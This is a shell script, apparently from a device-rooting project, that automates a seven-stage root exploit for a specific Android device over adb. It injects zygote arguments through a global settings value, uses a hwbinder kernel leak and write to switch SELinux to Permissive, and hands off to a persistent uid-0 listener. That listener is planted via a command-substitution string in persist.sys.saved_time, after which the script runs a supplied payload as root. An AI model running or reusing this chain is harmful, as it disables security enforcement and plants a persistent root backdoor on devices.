#!/bin/sh
set -eu

# Reroot a fresh-booted PS7331.4460N in one host-side flow.
#
# Chain rebuilt on each boot (the selinux_enforcing NULL write is in-memory
# and reverts on reboot):
#  1. wait for boot_completed + the pre-armed time_update waiter
#  2. use the boot's single injection to start the v51 amazon_app JNI carrier
#  3. HWBINDER_STATEFUL        -> leak / EALREADY (0x40...)
#  4. HWBINDER_STATEFUL_WRITE  -> stage 0x51, sets selinux_enforcing = 0
#  5. verify getenforce == Permissive
#  6. wait for the already-running UID-0 time_update waiter to observe
#     Permissive, launch the payload, and restore persist.sys.saved_time
#  7. verify sentinel, restore saved_time, confirm clean exit state
#
# Safety: never leaves a crafted saved_time behind; never reboots; reverts
# nothing on the write side (Permissive is the intended goal for the boot).

repo_dir="$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
adb_bin="$repo_dir/tools/xbps-root/usr/bin/adb"
adb_lib="$repo_dir/tools/xbps-root/usr/lib"
asset_dir=/data/securedStorageLocation/codex.amazon.jni.v51
probe_port=43271
forward_port=43212
socket_name=codex_amazon_app_v51a
nice_name=codex-system-amazon-v52
payload_device="${1:-}"
waiter_dir=/data/securedStorageLocation/w
waiter_trigger='x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'
old_time_file=/data/local/tmp/__reroot_old_time

adb() { LD_LIBRARY_PATH="$adb_lib" "$adb_bin" "$@"; }

die() { echo "FATAL: $*" >&2; exit 1; }
stage_hdr() { echo; echo "== $1 =="; }

if [ -n "$payload_device" ]; then
  [ -f "$payload_device" ] || die "payload file not found: $payload_device"
else
  echo "WARN: no payload supplied; chain will be built and stuck before the uid-0 run." >&2
fi

stage_hdr "1/7 boot state"
for i in $(seq 1 60); do
  boot="$(adb shell getprop sys.boot_completed 2>&1 | tr -d '\r')"
  [ "$boot" = 1 ] && break
  sleep 5
done
[ "$boot" = 1 ] || die "boot_completed never reached"

exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' 2>&1 | tr -d '\r')"
[ "$exempt" = null ] || [ -z "$exempt" ] || die "stale exemptions value present: $exempt"

saved_time="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
old_time="$(adb shell "cat $old_time_file" 2>&1 | tr -d '\r')"
case "$old_time" in
  ''|*[!0-9]*) die "unsafe saved_time present: $old_time" ;;
esac
[ "$saved_time" = "$waiter_trigger" ] \
  || die "time_update waiter is not armed: saved_time=$saved_time"
echo "boot=1 saved_time=WAITER_ARMED restore_value=$old_time exemptions=null"

if [ -n "$payload_device" ]; then
  adb push "$payload_device" /data/local/tmp/__reroot_payload.sh >/dev/null 2>&1 \
    || die "payload push failed"
  adb shell "chmod 0755 /data/local/tmp/__reroot_payload.sh" >/dev/null 2>&1 \
    || die "payload chmod failed"
fi

stage_hdr "boot-wiring precheck"
wiring="$(adb shell "logcat -d -v time 2>/dev/null | grep -icE 'no zygote connection|can.t set api blacklist|failed to set api blacklist'" 2>&1 | tr -d '\r')"
echo "wiring_failure_lines=$wiring"
# logcat persists across reboots, and our own injections legitimately log
# "Failed to set API blacklist exemptions" (the exemptions child re-dies after
# wrapper-exec), so this counter is noisy. Do not auto-reboot on it; the leak
# (stage 3) and injection (stage 6) retries already absorb transient failures.
[ "$wiring" = 0 ] || echo "WARN: wiring/noise lines present ($wiring); continuing anyway"

stage_hdr "2/7 carrier up on 127.0.0.1:$probe_port"
carrier_up() {
  [ "$(printf 'PING\n' | adb shell "toybox nc -w 3 127.0.0.1 $probe_port" 2>&1 | tr -d '\r')" = PONG ]
}
carrier_identity() {
  printf 'ID\n' | adb shell "toybox nc -w 3 127.0.0.1 $probe_port" 2>&1 | tr -d '\r'
}
carrier_start() {
  payload='LClass1;->method1(
10
--runtime-args
--setuid=10100
--setgid=10100
--runtime-flags=2049
--mount-external-full
--setgroups=3003
--nice-name='"$nice_name"'
--seinfo=amazonapp:targetSdkVersion=22:complete
com.android.internal.os.WebViewZygoteInit
--zygote-socket='"$socket_name"'
'
  {
    printf 'settings put global hidden_api_blacklist_exemptions "%s"\n' "$payload"
    printf 'settings delete global hidden_api_blacklist_exemptions\n'
  } | adb shell >/dev/null 2>&1

  adb forward --remove "tcp:$forward_port" >/dev/null 2>&1 || true
  adb forward "tcp:$forward_port" "localabstract:$socket_name" >/dev/null

  resp="$(python3 "$repo_dir/scripts/webview_zygote_preload_client.py" \
    --port "$forward_port" \
    --package "$asset_dir/agent.jar" \
    --libs "$asset_dir" \
    --library libcodex_jni.so \
    --cache-key "$asset_dir/agent.jar" 2>&1 | tail -1)"
  echo "preload_response=$resp"
  [ "$resp" = "preload_response=1" ] || return 1
  for i in $(seq 1 20); do
    carrier_up && return 0
    sleep 1
  done
  return 1
}

if ! carrier_up; then
  echo "carrier absent -> respawn via WebViewZygoteInit injection"
  carrier_start || die "carrier respawn failed"
  echo "carrier respawned, PONG"
else
  echo "carrier already live"
fi
identity="$(carrier_identity)"
echo "carrier_identity=$identity"
case "$identity" in
  *uid=10100*context=u:r:amazon_app:s0*) : ;;
  *) die "carrier is not the required uid-10100/amazon_app process: $identity" ;;
esac

stage_hdr "3/7 stateful leak (boot-spent on ENODATA; reboot to retry)"
# Single shot on the fresh carrier. ENODATA (0x50+errno 61) means the
# replace-marker missed but binder nodes stay active in the kernel AND in the
# carrier process; a respawned WebViewZygoteInit cannot rebind the taken
# abstract socket, and shell (uid 2000) cannot kill the uid-10100 carrier, so
# EALREADY follows until the whole device reboots. Leak success is
# result=0x5000000000000000.
run_leak() {
  adb shell "toybox nc -w 6 127.0.0.1 $probe_port" 2>&1 <<'EOF' | tr -d '\r'
HWBINDER_STATEFUL
EOF
}
leak="$(run_leak)"
echo "HWBINDER_STATEFUL $leak"
case "$leak" in
  *result=0x5000000000000000*)
    echo "leak confirmed: $leak"
    ;;
  *)
    echo "leak result not cleared (stateful leak failed). This boot's binder-node state is spent;"
    echo "NULL write requires a fresh kernel boot (in-boot carrier respawn cannot clear ENODATA/EALREADY)."
    echo "leak=$leak"
    die "stateful leak failed on fresh carrier: $leak"
    ;;
esac

stage_hdr "4/7 write null to selinux_enforcing"
w1="$(printf 'HWBINDER_STATEFUL_WRITE\n' | adb shell "toybox nc -w 6 127.0.0.1 $probe_port" 2>&1 | tr -d '\r')"
echo "HWBINDER_STATEFUL_WRITE $w1"
case "$w1" in
  *result=0x51*) : ;;
  *) die "unexpected write result: $w1" ;;
esac

stage_hdr "5/7 verify Permissive"
enforce="$(adb shell getenforce 2>&1 | tr -d '\r')"
echo "getenforce=$enforce"
[ "$enforce" = Permissive ] || die "SELinux still enforcing after write"

if [ -z "$payload_device" ]; then
  echo "no payload given; chain built and Permissive verified. exiting clean."
  exit 0
fi

stage_hdr "6/7 wait for pre-armed uid-0 time_update handoff"
root_reply=""
for i in $(seq 1 60); do
  root_reply="$(printf 'id -u\ncat /proc/self/attr/current\nexit\n' \
    | adb shell 'toybox nc -w 2 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
  case "$root_reply" in
    0*u:r:time_update:s0*) break ;;
  esac
  sleep 1
done
echo "root_service=$root_reply"
case "$root_reply" in
  0*u:r:time_update:s0*) : ;;
  *) die "pre-armed time_update payload did not create the root service" ;;
esac
adb logcat -d -s REROOTWAIT:I REROOT:I ROOTSVC:I '*:S' || true
echo "saved_time_now=$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
echo "time_update_svc=$(adb shell getprop init.svc.time_update | tr -d '\r')"

stage_hdr "7/7 exit-state guard"
# Restore proved impossible in-boot: time_update lacks property_socket write
# (avc denied, permissive=1) and run-as requires a debuggable package. The
# persist-armed waiter re-installs the uid-0 listener on every boot, which is
# the desired end state. Accept either numeric (restored) or still-armed.
restored="$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
echo "saved_time_state=$restored"
case "$restored" in
  "$old_time")
    echo "saved_time numeric == original -> persistence disabled cleanly (disarmed)" ;;
  x*)
    echo "saved_time still armed -> persistent-root waiter re-fires every boot" ;;
  ''|*[!0-9]*)
    die "unexpected saved_time state: $restored" ;;
  *)
    echo "saved_time numeric but != original ($old_time) -> time_update rewrote it; persistence disarmed (safe)" ;;
esac

exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' | tr -d '\r')"
echo "exemptions=$exempt"
[ "$exempt" = null ] || die "exemptions left set"

echo "enforce=$(adb shell getenforce | tr -d '\r')"
echo "OK reroot flow complete"
